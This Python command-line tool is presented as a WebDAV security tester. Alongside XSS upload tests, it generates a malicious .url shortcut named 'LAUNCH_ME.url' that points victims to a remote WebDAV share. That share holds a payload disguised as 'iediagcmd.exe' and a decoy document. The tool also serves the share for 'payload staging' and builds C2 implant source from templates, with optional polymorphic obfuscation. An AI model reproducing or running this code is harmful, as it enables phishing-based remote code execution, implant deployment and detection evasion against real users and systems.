import argparse
import json
import logging
import os
import sys
import textwrap
import time
from shutil import copyfile

# Assuming other modules are in the same directory or PYTHONPATH
from webdav_security_tester import WebDAVSecurityTester
from webdav_server import DAVServer

# Setup basic logging for the CLI tool itself.
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] %(name)s (CLI): %(message)s')
logger = logging.getLogger(__name__)

def generate_attack_package(p_path, d_path, c2_url):
    """
    Generates a complete attack package including a malicious .url file
    and copies the necessary payload and decoy files to the WebDAV root.
    """
    logger.info("Generating attack package...")
    webdav_reports_path = os.path.join("webdav_root", "reports")
    os.makedirs(webdav_reports_path, exist_ok=True)

    url_content = f"""
[InternetShortcut]
URL=file:///\\{c2_url}\\reports\\{os.path.basename(d_path)}
WorkingDirectory=\\\\{c2_url}\\reports\\
IconFile=\\\\{c2_url}\\reports\\icon.ico
"""
    try:
        # Copy and rename payload
        payload_dest = os.path.join(webdav_reports_path, "iediagcmd.exe")
        copyfile(p_path, payload_dest)

        # Copy decoy document
        decoy_filename = os.path.basename(d_path)
        decoy_dest = os.path.join(webdav_reports_path, decoy_filename)
        copyfile(d_path, decoy_dest)

        # Create the .url file
        url_file_path = "LAUNCH_ME.url"
        with open(url_file_path, "w") as f:
            f.write(textwrap.dedent(url_content))

        print("\n[+] Package generated successfully.")
        print(f"    - Payload and decoy copied to: {webdav_reports_path}")
        print(f"    - Shortcut created at: {os.path.abspath(url_file_path)}")
        print("\n[!] Run 'python ewt_cli.py serve --tls' to host the files.")

    except FileNotFoundError as e:
        logger.error(f"File not found during package generation: {e}. Please check your paths.")
    except Exception as e:
        logger.critical(f"An unexpected error occurred during package generation: {e}", exc_info=True)


def main():
    """Main entry point for the Enhanced WebDAV Security Testing tool CLI."""
    parser = argparse.ArgumentParser(
        description='Enhanced WebDAV Security Assessment Tool - Test for vulnerabilities, build payloads, and host files.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''
        Examples:
          # Run a single XSS test
          %(prog)s test --url https://webdav.example.com --test svg/script_tag --js-code "alert('XSS');"

          # Run a batch of tests from a config file
          %(prog)s batch --url https://webdav.example.com --config /path/to/my_tests.json

          # Build a payload from a template
          %(prog)s build --template ./templates/implant_v1.c.tpl --out ./payloads/implant.c --var1 "10.0.0.5" --var2 "4444"
          
          # Serve files from a directory over HTTPS
          %(prog)s serve --dir ./webdav_root --port 443 --tls
        ''')
    )
    subparsers = parser.add_subparsers(dest="command", help="Available commands")
    subparsers.required = True

    # --- Serve Command ---
    serve_parser = subparsers.add_parser("serve", help="Start a lightweight WebDAV server for payload staging.")
    serve_parser.add_argument("--dir", default="./webdav_root", help="Root directory to serve files from. Default: ./webdav_root")
    serve_parser.add_argument("--host", default="0.0.0.0", help="Host IP to bind the server to. Default: 0.0.0.0")
    serve_parser.add_argument("--port", type=int, default=8080, help="Port to run the server on. Default: 8080")
    serve_parser.add_argument("--tls", action="store_true", help="Enable TLS/SSL for the server (requires cert.pem and key.pem).")

    # --- Test Command ---
    test_parser = subparsers.add_parser("test", help="Run single or list available security tests.")
    server_group = test_parser.add_argument_group('Server Connection')
    server_group.add_argument('--url', required=True, help='Target WebDAV server URL.')
    server_group.add_argument('--username', help='Username for WebDAV authentication.')
    server_group.add_argument('--password', help='Password for WebDAV authentication.')
    server_group.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds.')
    server_group.add_argument('--no-verify-ssl', action='store_false', dest='verify_ssl', default=True, help='Disable SSL certificate verification.')
    execution_group = test_parser.add_mutually_exclusive_group(required=True)
    execution_group.add_argument('--test', metavar='FILETYPE/PAYLOADNAME', help='Run a single test (e.g., svg/script_tag).')
    execution_group.add_argument('--list-tests', action='store_true', help='List all available test types.')
    payload_params_group = test_parser.add_argument_group('Payload Parameters (for --test mode)')
    payload_params_group.add_argument('--js-code', help="JavaScript code to embed in relevant SVG payloads.")
    payload_params_group.add_argument('--callback-url', help="Callback URL for exfiltration payloads.")
    payload_params_group.add_argument('--target-element', help="CSS selector for targeting elements in CSS payloads.")
    output_group = test_parser.add_argument_group('Output and Reporting')
    output_group.add_argument('--output-dir', default='./ewt_output', help="Main directory for tool output.")
    output_group.add_argument('--report-dir', help="Specific directory for Markdown reports.")
    output_group.add_argument('--log-level', default='INFO', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], help='Set console logging level.')

    # --- Batch Command ---
    batch_parser = subparsers.add_parser("batch", help="Run a batch of tests from a JSON file.")
    batch_parser.add_argument('--config', required=True, metavar='JSON_FILE', help='Path to the JSON batch configuration file.')
    batch_server_group = batch_parser.add_argument_group('Server Connection')
    batch_server_group.add_argument('--url', required=True, help='Target WebDAV server URL.')
    batch_server_group.add_argument('--username', help='Username for WebDAV authentication.')
    batch_server_group.add_argument('--password', help='Password for WebDAV authentication.')
    batch_server_group.add_argument('--timeout', type=int, default=30, help='Request timeout.')
    batch_server_group.add_argument('--no-verify-ssl', action='store_false', dest='verify_ssl', default=True, help='Disable SSL certificate verification.')
    batch_output_group = batch_parser.add_argument_group('Output and Reporting')
    batch_output_group.add_argument('--output-dir', default='./ewt_output', help="Main directory for tool output.")
    batch_output_group.add_argument('--report-dir', help="Specific directory for Markdown reports.")
    batch_output_group.add_argument('--log-level', default='INFO', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], help='Set logging level.')

    # --- Build Command ---
    build_parser = subparsers.add_parser("build", help="Build payload source code from a template.")
    build_parser.add_argument('--template', required=True, help='Path to the payload template file.')
    build_parser.add_argument('--out', required=True, help='Output file for the generated payload source code.')
    build_parser.add_argument('--var1', required=True, help='Value for placeholder ##V1## (e.g., C2 IP).')
    build_parser.add_argument('--var2', required=True, help='Value for placeholder ##V2## (e.g., C2 Port).')
    build_parser.add_argument('--polymorphic', action='store_true', help='Enable polymorphic obfuscation for C/C++ templates.')

    args = parser.parse_args()

    if hasattr(args, 'log_level'):
        logging.getLogger().setLevel(getattr(logging, args.log_level.upper()))

    # --- Command Handling ---

    if args.command == "serve":
        server = DAVServer(root_path=args.dir, host=args.host, port=args.port, use_tls=args.tls)
        server.start()
        sys.exit(0)

    if args.command == "build":
        try:
            with open(args.template, 'r') as f:
                tpl_data = f.read()
            
            p_code = tpl_data.replace('##V1##', args.var1).replace('##V2##', str(args.var2))

            if args.polymorphic:
                from polymorphic_engine import PolymorphicEngine
                engine = PolymorphicEngine(p_code)
                p_code = engine.obfuscate()
                print("[+] Polymorphic obfuscation applied.")

            with open(args.out, 'w') as f:
                f.write(p_code)
            print(f"[+] Payload source generated successfully: {args.out}")
        except FileNotFoundError:
            logger.error(f"Template file not found: {args.template}")
            sys.exit(1)
        except Exception as e:
            logger.critical(f"An error occurred during payload generation: {e}", exc_info=True)
            sys.exit(1)
        sys.exit(0)

    # --- Logic for 'test' and 'batch' ---
    config = {
        'webdav_url': args.url,
        'username': args.username,
        'password': args.password,
        'output_dir': args.output_dir,
        'report_dir': args.report_dir or os.path.join(args.output_dir, 'reports'),
        'timeout': args.timeout,
        'verify_ssl': args.verify_ssl,
        'log_level': getattr(logging, args.log_level.upper())
    }

    try:
        tester = WebDAVSecurityTester(config)
    except Exception as e:
        logger.critical(f"Failed to initialize WebDAVSecurityTester: {e}", exc_info=True)
        sys.exit(1)

    if args.command == "test":
        if args.list_tests:
            logger.info("Listing available tests...")
            available_tests = tester.get_all_available_tests()
            if available_tests:
                print("\nAvailable tests (format: filetype/payloadname):")
                for test_name in available_tests:
                    print(f"  - {test_name}")
            else:
                print("No tests available or found.")
            sys.exit(0)
        
        if args.test:
            payload_params = {
                'js_code': args.js_code,
                'callback_url': args.callback_url,
                'target_element': args.target_element,
                'target_input_selector': args.target_element
            }
            # Filter out None values
            payload_params = {k: v for k, v in payload_params.items() if v is not None}
            
            try:
                file_type, payload_name = args.test.split('/', 1)
                logger.info(f"Running single test: FileType='{file_type}', PayloadName='{payload_name}', Params={payload_params}")
                remote_dir = f"ewt_single_test_{file_type}_{payload_name}_{int(time.time())}"
                tester.run_test(file_type, payload_name, params=payload_params, remote_target_dir=remote_dir)
            except ValueError:
                logger.error(f"Invalid format for --test argument: '{args.test}'. Must be 'filetype/payloadname'.")
                sys.exit(1)
            except Exception as e:
                logger.critical(f"An error occurred while running the test '{args.test}': {e}", exc_info=True)
                sys.exit(1)

    elif args.command == "batch":
        logger.info(f"Running batch tests from file: {args.config}")
        if not os.path.exists(args.config):
            logger.critical(f"Batch configuration file not found: {args.config}")
            sys.exit(1)
        try:
            with open(args.config, 'r', encoding='utf-8') as f:
                batch_data = json.load(f)
            
            test_configs = batch_data.get('tests', [])
            if not isinstance(test_configs, list):
                 raise TypeError("The 'tests' key in the batch file must contain a list of test configurations.")

            tester.run_batch_tests(test_configs)
        except (json.JSONDecodeError, TypeError) as ex:
            logger.critical(f"Invalid format in batch file {args.config}: {ex}")
            sys.exit(1)
        except Exception as e:
            logger.critical(f"An error occurred during batch test execution: {e}", exc_info=True)
            sys.exit(1)

    logger.info("Attempting to generate final report...")
    report_file_path = tester.generate_report()
    if report_file_path:
        logger.info(f"Execution finished. Report generated at: {report_file_path}")
    else:
        logger.warning("Execution finished, but report generation failed or no results to report.")

if __name__ == "__main__":
    main()